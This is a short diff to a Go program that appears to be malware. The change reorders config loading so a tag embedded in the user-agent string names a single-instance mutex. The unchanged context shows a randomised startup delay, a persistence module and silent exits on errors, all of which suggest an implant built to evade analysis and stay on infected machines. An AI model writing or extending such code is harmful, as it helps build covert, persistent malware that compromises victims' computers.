@@ -8,6 +8,7 @@ import (
 	"math/rand"
 	"net/http"
 	"os"
+	"strings"
 	"syscall"
 	"time"
 	"unsafe"
@@ -20,6 +21,15 @@ func main() {
 	seed, _ := crand.Int(crand.Reader, big.NewInt(math.MaxInt64))
 	rand.Seed(seed.Int64())
 	time.Sleep(time.Second * time.Duration(rand.Intn(10)+20))
+
+	var config Config
+	err := config.Init()
+	if err != nil {
+		os.Exit(0)
+	}
+	tag = strings.Split(config.userAgent, "|||")[1]
+	config.userAgent = strings.Split(config.userAgent, "|||")[0]
+
 	if _, err := CreateMutex(tag); err != nil {
 		os.Exit(0)
 	}
@@ -46,12 +56,7 @@ func main() {
 		time.Sleep(time.Second * 3)
 	}
 
-	var config Config
 	var persistence Persistence
-	err := config.Init()
-	if err != nil {
-		os.Exit(0)
-	}
 	err = persistence.Init(config)
 	if err != nil {
 		os.Exit(0)
